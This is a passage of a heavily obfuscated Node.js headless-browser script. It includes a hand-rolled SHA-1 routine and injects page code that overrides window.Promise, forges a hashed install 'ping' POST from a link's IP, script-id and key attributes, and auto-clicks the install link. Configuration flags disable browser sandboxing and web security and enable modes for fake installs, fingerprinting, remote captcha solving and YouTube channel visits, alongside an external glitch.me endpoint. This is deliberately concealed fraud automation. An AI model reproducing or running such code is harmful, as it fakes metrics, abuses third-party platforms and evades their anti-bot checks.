-0x1225 + 0x61e] |= (0x1c81 + -0x10 * -0x2 + -0x1bb1 | L >> -0x7 * -0x4d + 0x1 * -0x1cf9 + 0x1af0) << y[-0x25ba + -0xd * -0xb7 + 0x1c72 & N++], P[N >> 0x4fd + -0x1a2 * 0xe + -0x17 * -0xc7] |= (-0x204b + -0x26aa + 0x4775 | L >> -0x34f + 0x56e + -0x9 * 0x3b & -0x2331 + 0x1e87 + 0x1 * 0x4e9) << y[-0x2620 + 0xad * -0xe + 0x2f99 & N++], P[N >> 0x1bfd + -0x249 + 0x11e * -0x17] |= (-0x11cb + -0xbbb + 0x1e06 | L >> 0x2068 + -0x1 * 0x2683 + 0x1 * 0x621 & -0x266 + -0x1c80 + 0x43 * 0x77) << y[-0x1 * 0x1da8 + 0x26b5 + -0x90a * 0x1 & N++], P[N >> -0x9 * 0xf1 + -0x25d2 + 0x2e4d] |= (0x1cdc + -0x11d1 * -0x1 + -0x2e2d * 0x1 | -0x19 * -0x126 + -0x1 * -0xb0b + -0x2782 & L) << y[-0x1f0 + -0x1 * -0x2577 + -0x2384 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1992 + 0x102b * -0x2 + 0x3a28 ? (this['block'] = P[-0xf1a + -0x4 * 0x8c8 + 0x324a], this['start'] = N - (0x139c + -0x1c11 + 0x8b5), this['hash'](), this['hashed'] = -0x1523 * -0x1 + 0x107b * 0x1 + 0x259d * -0x1) : this['start'] = N;
                }
                return this['bytes'] > -0x1 * -0xfe26231f + 0x1bb7c2d07 * 0x1 + -0x1f8dd9 * 0xdff && (this['hBytes'] += this['bytes'] / (-0x6 * 0x2d08abaa + 0x949988 * 0x193 + 0x1244654e4) << 0x1325 + -0x1 * -0x198e + -0x2cb3 * 0x1, this['bytes'] = this['bytes'] % (-0xf8897 * 0xe3c + 0x16b6737 * 0xdc + 0x20 * 0x5267c91)), this;
              }
            }
            ['finalize']() {
              const V = d;
              if (!this['finalized']) {
                this['finalized'] = 0x1 * 0x110c + 0x5 * 0x1c6 + -0x9 * 0x2e1;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0xb * 0x1d7 + -0x1d79 + 0x4a6 * 0x2] = this['block'], J[K >> 0x2f * -0x35 + -0xc05 * -0x1 + -0x248] |= x[0x1233 * 0x1 + 0xfba + 0x6 * -0x5a7 & K], this['block'] = J[-0x2 * -0x1337 + 0x1e * -0xb + -0xc5c * 0x3], K >= 0x1f7 * -0xa + -0x153f + 0x839 * 0x5 && (this['hashed'] || this[V(0x10)](), J[0x7ed * 0x1 + -0x13a5 + 0xbb8] = this['block'], J[0x255d * 0x1 + -0x1 * -0xcd7 + -0x3224] = J[0x1 * -0x1558 + 0x7f1 * 0x1 + 0x2c * 0x4e] = J[0x24e2 + -0x2067 + -0x5 * 0xe5] = J[0x1706 + -0x3 * -0x475 + -0x1 * 0x2462] = J[0x1 * -0x2033 + -0x164f + -0x1 * -0x3686] = J[-0x419 * -0x4 + 0x1cc6 + -0x7f * 0x5b] = J[0x137 * -0x5 + -0x2422 + -0x2a3b * -0x1] = J[-0xc25 * 0x1 + -0xbc6 + 0x17f2] = J[0x485 + 0x1 * -0x623 + -0x1a6 * -0x1] = J[0x4 * -0x35c + -0x1 * 0x24c0 + 0x3239] = J[0x1e85 + 0x1 * 0x12b9 + -0x4 * 0xc4d] = J[0x221d + 0x1 * -0x169f + -0xb73] = J[0x1e66 * 0x1 + -0x94b + -0x150f] = J[0x7 * -0x4e3 + 0x2231 * 0x1 + 0x11 * 0x1] = J[0x2f9 + 0x24be + 0x30d * -0xd] = J[0x183f * -0x1 + 0x150e + -0x68 * -0x8] = -0x4f * -0x1c + 0xa1 * 0x1d + -0x1ae1), J[-0xc3b + 0x65b + 0x5ee] = this['hBytes'] << 0x6a9 * -0x1 + -0x126a + 0x1916 | this['bytes'] >>> -0x1307 + 0x561 + 0xdc3 * 0x1, J[-0xd3d * -0x1 + 0x957 + 0x481 * -0x5] = this['bytes'] << -0x2620 + -0x6 * -0x25 + 0x2545 * 0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1 * 0xefa + -0x2342 * 0x1 + 0x1458; J < 0x3 * 0xbce + -0x1326 + -0x3fd * 0x4; ++J)
                K = Q[J - (-0x2019 + -0x724 + 0x2740)] ^ Q[J - (-0x2 * 0xf31 + 0x1332 + -0x59c * -0x2)] ^ Q[J - (-0xc5c + -0x1 * 0x124 + 0xd8e)] ^ Q[J - (-0x1150 + -0x15b6 + 0x138b * 0x2)], Q[J] = K << 0x2428 + -0x4 * 0x8e7 + -0x8b | K >>> -0x270b + 0x983 * -0x4 + -0x2 * -0x269b;
              for (J = -0x3e1 * 0x7 + -0xb * -0x42 + 0x1851; J < -0x3a * 0x5 + 0x129e + -0x1168; J += 0x10df + -0xf29 + -0x1b1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x26ad + -0x12b3 * 0x1 + 0x3965 | L >>> -0x235 * -0x2 + 0xcb8 + 0x5ad * -0x3) + (M & N | ~M & O) + P + (-0x1a0543a * 0x6d + -0x1f01 * 0x3398b + 0x16fc164d6 * 0x1) + Q[J] << -0x68a + 0x1 * 0x1222 + -0x38 * 0x35) << -0x22 * -0x57 + -0xed1 + 0x348 | P >>> 0x25dc + 0x21c0 + -0x20b * 0x23) + (L & (M = M << -0x3dd + -0x3 * -0x906 + -0x101 * 0x17 | M >>> 0x2 * 0xa8d + -0x22a1 + -0x181 * -0x9) | ~L & N) + O + (-0x39b987c8 * 0x1 + -0x8b46291f + 0x23f04550 * 0x8) + Q[J + (-0x53 * 0x10 + -0x1246 * 0x2 + 0x29bd)] << 0xd3b + 0x45c + -0x1197) << 0xefb * -0x1 + 0x16c4 + -0x7c4 | O >>> 0x2 * 0x7f + -0x1cc1 * -0x1 + 0x769 * -0x4) + (P & (L = L << -0x21f2 + 0x92 * -0x5 + 0x24ea | L >>> 0x1fc7 + -0x4cd * -0x5 + -0x37c6) | ~P & M) + N + (0x3 * -0x9c38311 + 0x3deac96e + -0x39e2395e * -0x1) + Q[J + (-0x5 * -0x27 + 0x2113 + -0x21d4)] << -0x493 * 0x4 + -0x1b1a + 0x2d66) << 0x45f + -0x1 * 0x1e98 + 0x1a3e | N >>> -0x264d + 0x10f3 + 0x1575) + (O & (P = P << 0x230e + -0x4 * -0x7c3 + -0x41fc * 0x1 | P >>> 0x2 * 0xcc8 + 0x916 + -0x22a4) | ~O & L) + M + (0xc10dca1 + 0x57665c03 + -0x8f4bf0b) + Q[J + (-0x2 * 0x12ee + 0x765 + 0x53 * 0x5e)] << -0x11bd + -0x270f + 0xb5c * 0x5) << -0x255e + -0x169d + -0x10 * -0x3c0 | M >>> 0x1 * 0x1798 + -0x1303 + 0x3 * -0x17e) + (N & (O = O << 0x2 * 0x3f5 + 0x2509 + 0x2cd5 * -0x1 | O >>> 0xaa4 * -0x1 + 0x1 * -0x13f3 + -0x7 * -0x45f) | ~N & P) + L + (-0xabda9974 + -0x2ab * -0x12e016 + -0x1 * -0xd401385b) + Q[J + (-0x1e29 * -0x1 + -0x12a9 + -0xf5 * 0xc)] << 0x1edf + 0x3 * -0xa53 + 0x1a, N = N << 0x2d2 * -0x7 + 0x1156 + 0x286 * 0x1 | N >>> 0xa60 + -0xdc6 + 0x368;
              for (; J < 0x20e9 * 0x1 + 0x1890 + -0x3951; J += 0x5 * -0x544 + 0x10 * 0x22d + 0xc5 * -0xb)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1ec5 * -0x1 + 0x10 * 0x17 + -0x1d5a * -0x1 | L >>> 0xd * -0x218 + -0x248f + 0x3fe2) + (M ^ N ^ O) + P + (0x6c4 * 0x19da37 + 0x24ab324c + -0x64b9a2c7) + Q[J] << 0x1325 + 0x1483 + -0x27a8) << -0x239e + -0xfeb + 0x2 * 0x19c7 | P >>> -0x2 * 0x27e + -0x219 * 0xd + -0x6d * -0x4c) + (L ^ (M = M << -0x1 * -0x2577 + 0x1831 + 0x3d8a * -0x1 | M >>> 0xe95 * 0x1 + -0x10c8 + 0x5 * 0x71) ^ N) + O + (0x7dba17c8 + 0x400 * -0x69685 + 0xb79e7d9) + Q[J + (0xfc4 + -0x239f + 0x13dc)] << 0xae2 * 0x2 + 0x10 * 0x10f + -0x26b4) << 0x698 + -0xd3 * 0x19 + -0x4 * -0x382 | O >>> 0x22d * -0xc + -0x11ba + 0x2bf1) + (P ^ (L = L << 0x61c + 0x1a5 + 0x55 * -0x17 | L >>> 0xa0d + 0x51 * -0x4f + -0xae * -0x16) ^ M) + N + (-0x1 * 0x250ca596 + 0x440f72a7 + 0x4fd71e90) + Q[J + (-0xa5d * -0x2 + 0x19b6 + -0x2e6e)] << -0x1 * -0xac + -0x15f9 + -0x11f * -0x13) << 0x1 * -0x1705 + -0x4c9 * 0x1 + -0x1a3 * -0x11 | N >>> 0x1 * -0xb06 + 0x2211 + 0x1 * -0x16f0) + (O ^ (P = P << -0x6a * -0x4 + 0xcfd + -0xe87 | P >>> 0x1 * 0x248a + 0x1209 + -0x3691) ^ L) + M + (-0x7 * -0x1097a386 + 0xc7aa1c5e + -0xccf5a967) + Q[J + (-0xd2 + -0x1bef + 0x2 * 0xe62)] << -0x1 * 0x2662 + -0x22df + -0x186b * -0x3) << 0x25c4 + -0x64 * 0x4 + -0x242f | M >>> 0x198e * 0x1 + -0x1 * -0x1789 + -0x30fc) + (N ^ (O = O << -0x26d7 + -0x1b60 + 0x4255 | O >>> -0x1 * -0x1ff3 + 0x7b2 + -0x27a3) ^ P) + L + (-0x17afb422 + -0x63cdfe91 * -0x1 + 0x22bba132) + Q[J + (-0x63d * -0x6 + -0x592 + -0x1fd8)] << -0x95 * 0xe + 0xd * 0x89 + 0x131, N = N << -0x49d + 0x25 * -0xf1 + 0x2790 | N >>> -0x1bc8 + -0x4 * -0x92d + 0x146 * -0x7;
              for (; J < -0x2196 + 0x1215 * -0x1 + 0x33e7; J += 0x1f59 + 0x218f + -0x40e3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2eb * 0xb + -0x1 * 0x1eef + 0x1 * 0x3f0d | L >>> -0xd36 + -0x882 + 0x1 * 0x15d3) + (M & N | M & O | N & O) + P - (0xa0d130d1 * -0x1 + -0x30e1cb * -0x269 + 0x9be541b2) + Q[J] << -0x3d1 * -0x1 + 0x2 * 0x500 + 0x49b * -0x3) << -0x1ae + 0x1 * -0x26ad + 0x50c * 0x8 | P >>> -0xc4 + -0x160 + -0x5 * -0x73) + (L & (M = M << -0x3ab + -0x239 * -0xa + 0x1 * -0x1271 | M >>> -0x12fa + -0x1 * -0x1884 + -0x588) | L & N | M & N) + O - (-0x718e76ce + 0x6374b47c + 0x7efe0576) + Q[J + (-0x2c5 * 0x1 + 0x167c + -0xae * 0x1d)] << -0x2 * 0xfa3 + 0x24d * 0x9 + 0x1 * 0xa91) << 0x4d * 0x75 + 0x10 * 0x1a6 + -0x3d8c | O >>> -0x2112 + -0x1f03 + 0x4030) + (P & (L = L << 0x1 * -0xbe1 + 0xed7 + -0x2d8 | L >>> 0x221 * 0x1 + -0x1bde + 0x19bf) | P & M | L & M) + N - (0x2a30fd * -0x25f + -0x71ebe5a6 + -0x146da50ad * -0x1) + Q[J + (-0x971 * -0x2 + -0x1206 + 0x6d * -0x2)] << 0x8b * -0x3b + -0x1d * -0x95 + -0x5 * -0x308) << -0x3 * -0x2e7 + 0xbc3 * 0x2 + 0x3e * -0x85 | N >>> 0x943 + 0xed4 + -0x5 * 0x4cc) + (O & (P = P << -0x25d6 + -0x124f + -0x3843 * -0x1 | P >>> 0x6eb * -0x5 + 0x17a8 + 0xaf1) | O & L | P & L) + M - (0x1 * -0xc2d9d8a7 + 0xb5a8acbd + 0x42b * 0x1e402a) + Q[J + (-0x5c * 0x45 + 0x10d * 0x9 + 0x189 * 0xa)] << -0x11d6 + -0x2262 + 0x3438) << 0x16 * 0xb9 + -0x7 * 0x284 + 0x1bb | M >>> -0x1cfa * -0x1 + -0x8af + 0x50c * -0x4) + (N & (O = O << 0x1d47 + 0x13 * 0x61 + -0x245c | O >>> 0x2659 + -0x16 * 0x14c + 0x9 * -0x117) | N & P | O & P) + L - (-0x27a3130b + -0x5b9e38b4 + 0xf4258ee3) + Q[J + (0x2079 + 0xe65 + -0x2eda)] << 0xe * -0x9f + -0x18b * 0x5 + 0x1069 * 0x1, N = N << 0x13 * -0x6 + 0x36 * 0x67 + -0x1 * 0x152a | N >>> 0x269d + -0x1442 + -0x1259;
              for (; J < 0x19 * -0xe8 + -0x1 * -0x1b85 + -0x48d; J += 0xd7f * 0x2 + -0x5 * 0x446 + -0x59b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x540 * 0x6 + 0x18ab * 0x1 + 0x1 * -0x3826 | L >>> 0x24 * 0xf3 + -0x23de + -0x1 * -0x1cd) + (M ^ N ^ O) + P - (0x1143332a + 0x2 * -0xa0322f9 + 0x386050f2) + Q[J] << 0xba5 + -0x2 * -0xf97 + -0x2ad3) << -0x1 * 0x253e + 0x374 + 0x1 * 0x21cf | P >>> -0x17f8 + 0x241e * 0x1 + -0xc0b) + (L ^ (M = M << -0x4 * -0x305 + -0x10c * 0x20 + 0x1 * 0x158a | M >>> -0x96c + 0x333 * -0x2 + 0xfd4 * 0x1) ^ N) + O - (-0xd44500 + -0x3c1074f6 + -0x2a9b86 * -0x2b0) + Q[J + (-0x65 * 0x3b + 0x13d0 + -0x1bc * -0x2)] << 0x1e90 + 0x1 * 0xf5 + 0x1 * -0x1f85) << 0x924 * -0x1 + 0x2416 + -0x3d * 0x71 | O >>> -0x3e4 * -0x9 + -0x430 + -0x79 * 0x41) + (P ^ (L = L << -0x12 * 0x20a + 0x1b91 * 0x1 + -0x67 * -0x17 | L >>> -0x23ac + 0x20cc + 0x2e2) ^ M) + N - (-0x1824a64f + 0x308e5 * -0x1b05 + 0x9fc137f2) + Q[J + (0x78d + 0xac2 + 0x1 * -0x124d)] << 0x491 * -0x2 + -0x1 * -0x9d6 + -0xb4) << 0xfb * 0x22 + -0x1bc5 * 0x1 + -0x58c | N >>> 0x46d + 0x140d + -0x185f) + (O ^ (P = P << 0x3 * 0x712 + -0x77c * -0x4 + -0x5c * 0x8e | P >>> 0xf98 + -0x161e + 0x688) ^ L) + M - (-0x1266323 * 0x1 + -0x587 * 0xedf7 + 0x3be6f18e) + Q[J + (0xe41 + 0x1dc0 + -0x3 * 0xeaa)] << 0x370 + 0x1 * 0x4f + 0x89 * -0x7) << 0x2020 + -0x264e * -0x1 + -0x4669 | M >>> 0x2002 + -0x1f07 + -0xe0) + (N ^ (O = O << 0x4c + 0x2 * -0x61a + -0x156 * -0x9 | O >>> 0x1898 + 0xa60 + -0x22f6) ^ P) + L - (-0x9f8 * -0xa2a12 + 0x173eea4 * 0x4 + 0x2 * -0x1ac2efeb) + Q[J + (0x1 * 0x18d7 + 0x10 * 0x161 + 0x1 * -0x2ee3)] << 0x7 * 0x3ca + 0x21d9 + 0x3c5f * -0x1, N = N << 0x265 * -0x3 + -0x1299 + -0x3 * -0x8a2 | N >>> -0x582 * -0x6 + 0x7f * -0x41 + -0x1 * 0xcb;
              this['h0'] = this['h0'] + L << -0x215 * 0xf + 0x51b * -0x5 + 0x38c2 * 0x1, this['h1'] = this['h1'] + M << 0x1 * -0x234d + -0x1d35 + 0x4082, this['h2'] = this['h2'] + N << -0x2695 + -0x2 * -0xc50 + -0x1 * -0xdf5, this['h3'] = this['h3'] + O << -0xe * -0xb5 + 0x18ae + 0x2 * -0x114a, this['h4'] = this['h4'] + P << 0xda3 + 0xede + -0x1c81 * 0x1;
            }
            ['hex']() {
              const W = d;
              this[W(0x7)]();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1730 + -0x8 * 0x2c5 + -0xec & -0xcc6 + 0x9c2 * 0x3 + -0x1 * 0x1071] + w[J >> -0x1 * -0x1ff9 + -0x4 * -0x3b + -0x20cd & 0x74 * 0x18 + -0x1800 + -0x19 * -0x87] + w[J >> -0x47b * 0x2 + 0x23f1 * -0x1 + 0x2cfb & -0x323 * 0xb + -0x1 * -0xb29 + -0x3 * -0x7cd] + w[J >> -0x261e + 0x1 * 0x2605 + -0x1 * -0x29 & 0x1 * 0x13ff + 0x16c3 * 0x1 + 0x11 * -0x283] + w[J >> 0x1 * -0x3e6 + -0xb * 0x1a5 + 0x1609 & 0x1159 + -0x1 * 0xc2d + -0x4d * 0x11] + w[J >> 0x3 * -0x56d + 0xd7d + 0x169 * 0x2 & 0xe5a + 0x118b + 0x1fd6 * -0x1] + w[J >> 0x299 * 0xf + -0x1a74 + -0x7 * 0x1c9 & 0x5a * 0x1 + -0x1eb * 0x11 + 0x10 * 0x205] + w[0x82a + 0x37 * -0x9b + 0x1932 & J] + w[K >> -0x266b + -0x1856 * 0x1 + -0xd1 * -0x4d & -0x6e * 0xa + -0x17ec + 0x1c47] + w[K >> 0x1a23 + 0x3b * -0x6d + -0xec & 0x26d3 + -0x2d9 * 0x1 + -0xf * 0x265] + w[K >> -0x2056 * -0x1 + 0x9f4 + -0x2a36 & -0x6b * -0x19 + 0x1561 + 0x1fc5 * -0x1] + w[K >> -0x6ce + 0x97e + -0x2a0 & 0x2622 + -0x491 * -0x7 + 0x6e * -0xa3] + w[K >> -0x4 * -0x4ea + -0x11a9 + 0x1 * -0x1f3 & -0x1faa + 0xb * 0x2c + -0x7 * -0x443] + w[K >> 0x67f * 0x1 + -0x1cce * 0x1 + -0x12d * -0x13 & -0x1be9 + 0x1 * -0x156e + 0x3166] + w[K >> 0x1f39 * 0x1 + -0x1a38 + 0x1 * -0x4fd & 0x1 * 0x25e5 + 0xf6e + -0xe * 0x3ce] + w[0x3 * -0xcd3 + 0xf8a + 0x36 * 0x6d & K] + w[L >> 0x8a7 * -0x3 + 0x2ca + -0x1747 * -0x1 & -0x1 * -0x17e1 + -0x11a0 + -0x632] + w[L >> 0x1d4a + 0x24a + -0x1f7c & -0x837 + -0x15ff + -0x11f * -0x1b] + w[L >> 0xf * -0x3f + -0x1f3 * 0x9 + 0x1550 & 0x1 * 0x148f + -0x105c + -0x35 * 0x14] + w[L >> 0x1 * -0x1cff + 0x1c63 + 0xac & -0x1d87 + 0x2507 + 0x771 * -0x1] + w[L >> -0xea6 + -0xd5a * 0x2 + -0x2f5 * -0xe & 0x1314 + 0x21f9 + -0x792 * 0x7] + w[L >> -0x788 + 0x1 * -0x14b9 + 0x1c49 & 0x69 + -0x3 * -0x511 + -0x1 * 0xf8d] + w[L >> 0x246b + 0x1a30 + -0x3e97 & 0x1aee + -0x231b + 0x44 * 0x1f] + w[-0x1 * 0x1cbd + 0x7ce + 0x14fe & L] + w[M >> -0x1960 * 0x1 + -0x183d + 0x31b9 & -0x26 * -0xaf + 0x180 + -0x1b6b] + w[M >> 0x16f2 + -0x1 * -0x6b7 + -0x105 * 0x1d & -0x20b * -0xd + -0x2213 + 0x1 * 0x793] + w[M >> 0x1 * 0x1f9 + -0x1656 + -0x1 * -0x1471 & 0xbd2 + 0x1435 * 0x1 + -0x21 * 0xf8] + w[M >> 0xdf2 + -0x1 * 0x1639 + 0x3d * 0x23 & -0x1ca3 * 0x1 + -0x3 * -0x45a + -0x16c * -0xb] + w[M >> -0x1 * -0x96b + 0x210a * 0x1 + -0x2a69 & -0x1d * 0x21 + 0x3a8 * 0x5 + -0xe7c] + w[M >> -0x595 * 0x6 + 0x5a1 * -0x1 + 0x303 * 0xd & -0x1 * -0xf39 + -0x1 * -0x5d9 + 0x1503 * -0x1] + w[M >> -0x2f5 * -0x5 + -0x9 * 0x1f9 + 0x2fc & 0xc3f * -0x1 + 0x1de5 * 0x1 + -0x1197 * 0x1] + w[0x2115 + 0x1a3 + -0x22a9 & M] + w[N >> 0x195d + 0x20e7 * -0x1 + 0x7a6 & -0x1 * -0x18a2 + -0x11 * 0xc5 + -0x1 * 0xb7e] + w[N >> 0x1 * -0x215 + -0x543 * 0x4 + 0x1739 & 0x2031 + -0x1e12 + -0xb0 * 0x3] + w[N >> -0xa * -0x2d5 + -0x211 + -0x1a2d & -0x121 * 0x1a + -0x1 * 0x24fd + -0xb11 * -0x6] + w[N >> 0x633 + 0x162a * 0x1 + 0x1e3 * -0xf & -0x178f + -0x1336 * 0x1 + -0x156a * -0x2] + w[N >> -0x1a * -0xbf + -0x889 * 0x4 + 0x277 * 0x6 & 0x47 * -0x7b + 0x1 * 0x679 + 0x1bb3] + w[N >> -0x2595 * -0x1 + 0x1f86 + -0x1 * 0x4513 & 0x11a1 + -0x25 * -0x54 + -0xedb * 0x2] + w[N >> 0x1722 + 0x2d8 + 0xcfb * -0x2 & -0xa5 * 0xc + 0x14b9 + 0x14b * -0xa] + w[-0x432 * -0x1 + -0x1fa6 + 0x1 * 0x1b83 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x12d1 + -0x2594 * -0x1 + -0x12ab & -0x3e0 + 0x1a32 * 0x1 + 0x1553 * -0x1,
                J >> -0x1757 + 0x258e + -0xe27 & 0x1 * -0x86d + -0x1128 + 0x1a94,
                J >> 0x5e2 + -0x150e * -0x1 + -0x35d * 0x8 & -0x2b * -0x86 + 0xd * -0x1d5 + -0x127 * -0x2,
                -0xe * 0x1d + 0x1b90 + -0x18fb & J,
                K >> 0x10 * -0x11c + 0x221f + -0x9 * 0x1cf & -0x1 * 0xf6 + -0x1bb0 + 0x1da5,
                K >> -0x22ec + -0x47 + -0x11 * -0x213 & 0x1 * 0x404 + -0x943 * 0x1 + 0x2f * 0x22,
                K >> 0x2015 + -0x1 * 0x2e3 + 0xe95 * -0x2 & -0x17d6 + -0xffd * -0x1 + 0x8d8,
                0x105 * 0xd + 0x2600 + 0x2 * -0x1921 & K,
                L >> 0x1d * 0x12b + 0x1b * -0x1e + -0x1e9d & 0x2413 + -0x167 + -0x21ad * 0x1,
                L >> -0xbc3 * 0x2 + 0x59f + -0x11f7 * -0x1 & 0x1705 + 0x3b9 * -0x5 + 0x61 * -0x9,
                L >> 0x55 * -0x72 + -0x2 * -0xa7b + 0x26 * 0x72 & 0x114 * 0x23 + 0x832 * -0x1 + -0x1c8b,
                0x3 * -0x18d + 0x28 * 0xad + -0x77 * 0x2e & L,
                M >> 0x1a23 * 0x1 + 0x11f1 + 0x4 * -0xaff & -0x55 * 0x9 + -0x1fe4 + 0x520 * 0x7,
                M >> 0xff1 + -0x1162 * 0x1 + -0xb * -0x23 & -0x1 * -0x600 + 0x7 * -0x1d7 + 0x7e0,
                M >> -0x53 * 0x1d + 0x1463 + 0x1 * -0xaf4 & 0x19f2 + -0x123f + -0x6b4,
                0xbb8 + -0x6bb * 0x2 + 0x2bd & M,
                N >> 0x1 * -0xc6d + 0xdb + 0xbaa & 0x151b + 0x257c + -0x3998,
                N >> 0x14c * -0x14 + 0x1824 + 0x1dc & -0x1ec6 + -0x39e * -0x1 + 0x1 * 0x1c27,
                N >> 0x115 * 0x7 + -0x1 * 0x24cb + 0x1d40 & 0x1 * -0x2555 + -0x18c + 0x10 * 0x27e,
                -0x9 * -0x2e1 + -0x171 * 0x4 + -0x1326 * 0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1 * -0xe3c + 0x2 * -0x10a5 + 0x2f9a), (K = new DataView(J))['setUint32'](-0x5 * 0x150 + 0x42d * 0x9 + -0x1f05, this['h0']), K['setUint32'](0x208d + -0x2328 + 0x29f, this['h1']), K['setUint32'](0x1eef + -0xf6 * -0x27 + -0x4461, this['h2']), K['setUint32'](0xcd + -0xb + -0xb6, this['h3']), K['setUint32'](-0x42d + 0x1498 + -0x1 * 0x105b, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x13b7 + 0x232c + -0x1 * 0x36e3];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1f01 + 0xd * -0xe2 + 0x7d * 0x57;
            J[0x1182 + -0x1008 + -0x17a]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x17a8 + -0x7 * -0x4e4 + 0x4e * -0xbe] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0xe3 * -0x17 + -0x4f * -0x1e + 0x7c * 0x17), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1ed * 0xd + 0x23c4 + -0x3ccc;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x23cc + -0xbdc + 0x3584), Promise['resolve'](0x1f00 + -0xbc7 + -0x1338);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x6a8 + 0x1f49 * 0x1 + -0x1 * 0x25f1; j < 0x5 * 0x17b + 0x4 * 0x3e6 + -0x16fe; j++)
    i();
}
const NETWORK_PATIENCE = -0x534 + 0x56 * 0x52 + -0xa * -0xe4 + (0x61 * 0x21 + 0x4 * -0x45 + 0x4b) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1b26 + -0x1476 + 0x1 * -0x6ad) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1 * 0xe57 + -0x246b * -0x1 + -0x1614; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
